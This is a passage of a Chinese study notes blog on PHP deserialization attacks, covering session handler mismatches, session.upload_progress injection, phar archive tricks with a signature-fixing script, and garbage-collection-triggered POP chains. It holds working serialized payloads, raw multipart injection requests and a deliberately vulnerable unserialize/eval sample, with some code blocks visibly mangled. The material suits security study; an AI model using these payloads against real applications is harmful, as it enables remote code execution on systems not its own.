alt="image-20240502145746648"></p><p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p><p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="自建环境模拟"><a href="#自建环境模拟" class="headerlink" title="自建环境模拟"></a>自建环境模拟</h4><p>建造一个环境，有两个文件，分别如下：</p><p>flag.php：</p><p>这个页面用于接受session的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.php：</p><p>这个页面用于测试反序</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先访问1.php，输出</p><p><img src="https://bu.dusays.com/2024/05/13/6641630f99e53.png" alt="image-20240502145916097"></p><p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e91508.png" alt="image-20240502145939815"></p><p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e51444.png" alt="image-20240502150059478"></p><p>此时的session:</p><p><code>a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</code></p><p>这里可以看到成功写入，这是再访问以下1.php</p><p>成功反序列化</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d61924.png" alt="image-20240502150217878"></p><p><strong>但是这里的局限性太大，有如下条件：</strong></p><ul><li>两个文件session引擎配置不同</li><li>其中一个session可控</li><li>两个文件同域</li></ul><p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p><h4 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h4><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p><p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p><p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p><p>条件：</p><ol><li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li><li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li></ol><p>这两个都是可在查的</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e9ead5.png" alt="image-20240502150413937"></p><p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload</p><p><strong>对session上传进度说明一下：</strong></p><p><img src="https://bu.dusays.com/2024/05/13/66416314eb260.png" alt="image-20240502150438892"></p><p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure><p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p><p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure><p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p><h4 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h4><p><strong>同样需要php≥5.4</strong></p><p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure><p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，表示当文件上传结束后，php将会立即清空对应session文件中的内容，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p><p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p><p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p><p>开始解析：</p><ol><li></li></ol><ul><li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li><li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li></ul><p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p><p>其他例题参考：<br>简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h3 id="phar反序列化基础"><a href="#phar反序列化基础" class="headerlink" title="phar反序列化基础"></a>phar反序列化基础</h3><p>phar是一种文件</p><p><img src="https://bu.dusays.com/2024/05/13/6641632023214.png" alt="image-20240303175826285"></p><p>phar与反序列化关系</p><p><img src="https://bu.dusays.com/2024/05/13/664163173458e.png" alt="image-20240303180037559"></p><p>结构：<br><img src="https://bu.dusays.com/2024/05/13/66416323ea225.png" alt="image-20240303180142912"></p><p><img src="https://bu.dusays.com/2024/05/13/66416322084e7.png" alt="image-20240303180338837"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632425ffb.png" alt="image-20240303180413877"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632269c76.png" alt="image-20240303180429119"></p><p>原理：</p><p><img src="https://bu.dusays.com/2024/05/13/66416321cbe89.png" alt="image-20240303180705908"></p><p>例1：</p><p><img src="https://bu.dusays.com/2024/05/13/66416312cbfb2.png" alt="image-20240303180820143"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630f2077f.png" alt="image-20240303181134271"></p><p>（改类名 命令）</p><p><img src="https://bu.dusays.com/2024/05/13/6641a0e937350.png" alt="image-20240303181349949"></p><p>条件：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631ddae81.png" alt="image-20240303181625522"></p><p>例2：</p><p><img src="https://bu.dusays.com/2024/05/13/66416318000d2.png" alt="image-20240303181818732"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631d55b04.png" alt="image-20240303181937798"></p><p><img src="https://bu.dusays.com/2024/05/13/664163182c5d1.png" alt="image-20240303182021472"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0ef6e8d9.png" alt="image-20240303182128988"></p><p>生成.phar文件</p><img src="https://bu.dusays.com/2024/05/13/6641631787c31.png" alt="image-20240303182310868" style="zoom:150%;" /><p>版本问题 </p><p>把php.ini中的参数（phar.readonly）改了</p><p>不挑后缀</p><p>text.phar-&gt;text.jpg</p><p><img src="https://bu.dusays.com/2024/05/13/6641631546fd4.png" alt="image-20240303182806367"></p><p><img src="https://bu.dusays.com/2024/05/13/66416321ae70d.png" alt="image-20240303182838379"></p><h3 id="脏数据污染"><a href="#脏数据污染" class="headerlink" title="脏数据污染"></a>脏数据污染</h3><p>phar支持的格式</p><p>phar文件可以是下面三种格式：</p><blockquote><ul><li>zip .zip .phar.zip </li><li>tar .tar .phar.tar .pahr..tar.gz .phar.tar.bz </li><li>phar .phar .phar.bz2   <code>bzip2 phar.phar</code></li></ul></blockquote><p>在实战中的利用</p><ol><li>可以使用压缩包的方法直接将数据压缩为<code>zip</code>,<code>tar</code>,<code>tar.gz</code>,<code>tar.bz</code>从而绕过<code>stub</code>或反序列化字段的检测(zip不会压缩反序列化数据段) </li><li>可以使用<code>.phar格式修复</code>的方法解决phar文件头部(使用phar)或者文件尾(使用tar)被添加脏数据的问题</li></ol><h4 id="zip添加脏数据"><a href="#zip添加脏数据" class="headerlink" title="zip添加脏数据"></a>zip添加脏数据</h4><p> — 头尾均可添加脏数据但是phar无法解析</p><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/phith0n/PaddingZip&source=article&objectId=2287505">https://github.com/phith0n/PaddingZip</a> </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python paddingzip.<span class="property">py</span> -i ../test.<span class="property">phar</span>.<span class="property">zip</span> -o ../test1.<span class="property">phar</span>.<span class="property">zip</span> --prepend <span class="string">&quot;this prepend to the start&quot;</span> --append <span class="string">&quot;this append to the end&quot;</span></span><br></pre></td></tr></table></figure><p>此外在readme手册中还提到可以在linux中通过以下方式添加脏数据:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$ echo -n <span class="string">&quot;prepend&quot;</span> &gt; f</span><br><span class="line">$ cat f a.<span class="property">zip</span> &gt; b.<span class="property">zip</span></span><br><span class="line">$ zip -F b.<span class="property">zip</span> --out c.<span class="property">zip</span></span><br></pre></td></tr></table></figure><p>在phar中的使用限制</p><p>ZIP格式的文件头尾都可以有脏字符，通过对偏移量的修复就可以重新获得一个合法的zip文件。但是否遵守这个规则，仍然取决于zip解析器，经过测试，phar解析器如果发现文件头不是zip格式，即使后面偏移量修复完成，也将触发错误</p><p>虽然zip添加不了脏数据让人大失所望,但是却在这里看到了zip却只要将phar的内容写进压缩包注释中，也同样能够反序列化，而且压缩后的zip数据也可以绕过stub检测,但是过不了反序列化数据检测(和Phar执行zip生成格式差不多,但是挺有意思的记一下吧)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    public  <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">var_dump</span>(__FUNCTION__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">phar_file = <span class="title function_">serialize</span>(<span class="keyword">new</span> <span class="title function_">test</span>());zip = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">res =zip-&gt;<span class="title function_">open</span>(<span class="string">&#x27;justzip.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line">zip-&gt;<span class="title function_">addFromString</span>(<span class="string">&#x27;h0cksr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);zip-&gt;<span class="title function_">setArchiveComment</span>(phar_file);zip-&gt;<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">readfile</span>(<span class="string">&quot;phar://justzip.zip&quot;</span>);</span><br></pre></td></tr></table></figure><p>哪些场景不能解析带脏字符的zip文件呢? </p><ol><li>Java -jar执行这个带脏字符的jar包时会失败</li><li>PHP无法解析 </li><li>7zip无法解析</li></ol><h4 id="tar添加脏数据"><a href="#tar添加脏数据" class="headerlink" title="tar添加脏数据"></a>tar添加脏数据</h4><p> — 可以在文件尾添加脏数据且phar正常解析</p><p><strong>对于tar格式</strong>，如果能控制文件头，即可构造合法的tar文件，即使文件尾有垃圾字符</p><p>这个测试的话毫无技术要求,直接使用010打开<code>tar</code>文件, 然后触发调用可以看到phar反序列化还是被正常执行了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//class test&#123;</span></span><br><span class="line"><span class="comment">//    public  function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        var_dump(__FUNCTION__);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//phar=new phar(&#x27;test.phar&#x27;);//后缀名必须为phar</span></span><br><span class="line"><span class="comment">//phar = phar-&gt;convertToExecutable(Phar::TAR);</span></span><br><span class="line"><span class="comment">//phar-&gt;startBuffering();</span></span><br><span class="line"><span class="comment">/*phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub*/</span></span><br><span class="line"><span class="comment">//obj=new test();</span></span><br><span class="line"><span class="comment">//phar-&gt;setMetadata(obj);//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//phar-&gt;addFromString(&quot;flag.txt&quot;,&quot;flag&#123;h0cksr&#125;&quot;);//添加要压缩的文件</span></span><br><span class="line"><span class="comment">////签名自动计算</span></span><br><span class="line"><span class="comment">//phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="comment">//?&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    public  <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">var_dump</span>(__FUNCTION__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test1.phar.tar/flag.txt&quot;</span>)<span class="comment">//未修改,读取数据失败,反序列化触发成功</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test2.phar.tar/flag.txt&quot;</span>)<span class="comment">//文件头添加内容,读取数据失败,反序列化触发失败</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test3.phar.tar/flag.txt&quot;</span>)<span class="comment">//文件尾添加内容,读取数据失败,反序列化触发成功</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这段PHP代码主要展示了如何使用Phar归档文件，以及如何通过Phar文件来触发对象的反序列化。Phar是一种PHP的归档格式，允许开发者将多个PHP文件打包成一个文件，并可以直接通过PHP解释器执行。</p><p>然而，代码中有一些注释掉的部分，这些部分原本是用来创建Phar文件的。代码的目的似乎是为了测试不同情况下通过Phar文件读取数据时，是否能够成功触发对象的反序列化。</p><p>此外还在<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://exp10it.cn/2022/08/phar-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/%23%E4%BD%BF%E7%94%A8-tar-%E7%BB%95%E8%BF%87%E7%AD%BE%E5%90%8D&source=article&objectId=2287505">使用 tar 绕过签名</a>看到可以直接使用打包一个只放了反序列化数据的<code>.metadata</code>文件生成的.tar压缩包可以直接用来触发反序列化</p><blockquote><p> linux环境下执行  mkdir test;cd test mkdir .phar;cd .phar echo ‘O:4:”test”:0:{}’ &gt; .metadata cd ..&#x2F;.. tar -cf phar.tar .phar&#x2F; 生成的<code>phar.tar</code>可以直接通过<code>phar://phar.tar</code>触发反序列化 </p></blockquote><h4 id="pahr文件"><a href="#pahr文件" class="headerlink" title="pahr文件"></a>pahr文件</h4><p> — 可以在文件头添加脏数据且phar正常解析</p><p><strong>phar格式</strong>，必须控制文件尾，<code>但不需要控制文件头</code>。PHP在解析时会在文件内查找<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串<code>GBMB</code>结尾。</p><p>phar格式可以直接在文件头加脏数据并且还能正常反序列化, 但是这点需要重新计算一下签名, 下面就是修正签名的脚本</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    content = f.<span class="title function_">read</span>()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">28</span>]</span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line">sig = hashlib.<span class="title function_">sha1</span>(text).<span class="title function_">digest</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;phar_new.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    f.<span class="title function_">write</span>(text + sig + end)</span><br></pre></td></tr></table></figure><p>(pahr默认使用sha1加密就是有<code>20字节</code>的签名生成结果, 在签名后面还有<code>8字节</code>,<code>前4字节表示文件使用的签名算法</code>,<code>最后四字节固定用于表示该文件存在签名</code>)</p><p>phar文件内容&#x3D;数据段+签名(默认sha1有20字节大小)+签名方式(4字节)+声明文件有无签名(4字节)</p><p>除了sha1之外phar还可以使用<code> MD5, SHA256, SHA512, OpenSSL</code>生成签名</p><p>签名是前面全部<code>数据段</code>的内容根据加密算法加密得到的结果</p><p>所以当我们想要利用phar触发反序列化但是上传的文件在头部被添加了脏数据的话我们可以通过以下方法构造可利用的phar文件:</p><blockquote><ol><li>先生成正常的的<code>.pahr</code>文件</li><li>往文件头部添加脏数据</li><li>使用上面代码改正签名</li><li>使用010editor将头部的脏数据删除</li><li>上传文件</li></ol></blockquote><h2 id="GC强制回收"><a href="#GC强制回收" class="headerlink" title="GC强制回收"></a>GC强制回收</h2><p>__dustruct执行条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：对象为null</span><br><span class="line">2：生命周期结束的时候</span><br><span class="line">3：当一个对象被unset （GC)</span><br></pre></td></tr></table></figure><p>由此</p><blockquote><p>如果程序走了一半，突然报错，那么<code>__destruct()不会触发了，那如果又必须要__destruct()触发</code>,又该如何操作呢？</p></blockquote><p>PHP Garbage Collection简称GC，又名垃圾回收，在PHP中使用引用计数和回收周期来自动管理内存对象的。</p><p>垃圾，顾名思义就是一些没有用的东西。在这里指的是一些数据或者说是变量在进行某些操作后被置为空(NULL)或者是没有地址(指针)的指向，这种数据一旦被当作垃圾回收后就相当于把一个程序的结尾给划上了句号，那么就不会出现无法调用__destruct()方法了。</p><p>具体原理可查看php官方解答<a href="https://www.php.net/manual/zh/features.gc.collecting-cycles.php">PHP: 回收周期(Collecting Cycles) - Manual</a></p><p>接下来用演示代码演示GC的实际工作原理</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;num = <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__destruct()&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">3</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时结果：</p><p><img src="https://bu.dusays.com/2024/05/13/66416313d17a7.png" alt="image-20240312201424971"></p><p>如图，</p><p><code>new了一个errorr对象，屁股还没坐热就__destruct()了。后面的两个对象则是按部就班先创建完没有操作了以后才结束的。</code></p><p><strong>区别就在于对象1没有任何引用也没有指向，在创建的那一刻就被当作垃圾回收了，从而触发了__destruct()方法。</strong></p><p>进而，如果没有指向可以，那如过在指向一个对象的中途忽然指向另一个，也就是舍弃了该对象又会怎么样。</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240312201642801.png" alt="image-20240312201642801"></p><p>仍然触发了__destruct</p><p>但若注销了<code>$c[0]=$c[1]</code>呢</p><p><img src="https://bu.dusays.com/2024/05/13/66416313d6b21.png" alt="image-20240312201830825"></p><p>如图 正常创建，最后销毁</p><p>当一个对象没有任何引用的时候，则会被视为“垃圾”，即</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new test();</span><br></pre></td></tr></table></figure><p>test 对象被 变量 a 引用， 所以该对象不是“垃圾”，而如果是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new test();</span><br><span class="line">或这样</span><br><span class="line"></span><br><span class="line">$a = new test();</span><br><span class="line">$a = 1;</span><br></pre></td></tr></table></figure><p>这样在 test 在没有被引用或在失去引用时便会被当作“垃圾”进行回收,触发__destruct。</p><p>这就是GC回收的大致理解</p><p>所以例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __toString&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;err-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __flag()&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;就这？&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显</p><p>首端 –&gt; <strong>errorr0::__destruct()</strong> –&gt; <strong>errorr1::__toString()</strong> –&gt; <strong>errorr2::flag()</strong> –&gt;尾巴。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span 